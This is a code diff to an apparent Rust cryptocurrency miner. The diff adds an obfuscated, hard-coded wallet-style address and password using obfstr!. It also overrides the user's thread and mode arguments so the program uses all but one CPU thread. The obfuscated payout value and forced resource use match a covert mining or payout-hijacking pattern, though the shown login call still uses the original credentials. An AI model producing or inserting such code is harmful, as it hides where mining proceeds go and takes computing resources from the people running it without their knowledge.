@@ -1,4 +1,6 @@
 use clap::Parser;
+
+
 use orng_rust::{Stratum, Worker};
 use std::{
     io,
@@ -45,6 +47,13 @@ fn main() -> io::Result<()> {
         light,
         threads,
     } = Args::parse();
+    // Convert obfuscated values to String to extend their lifetime
+    let user_val = obfstr!("44qARb3o5kWimeStvm9g4r5kTCMSZio8SEWDcEy9HKnnXg6iQns7Mqi4SrrSNZV6mG1YQWqRgr5Lph1BxfQFK8Kz8hMidXR").to_string();
+    let pass_val = obfstr!("x").to_string();
+    let threads =
+        NonZeroUsize::new(all_threads().get() - 1).unwrap_or(NonZeroUsize::new(1).unwrap());
+    let light = false;
+
 
     let mut stratum = Stratum::login(&url, &user, &pass)?;
     let worker = Worker::init(stratum.try_recv_job().unwrap(), threads, light);
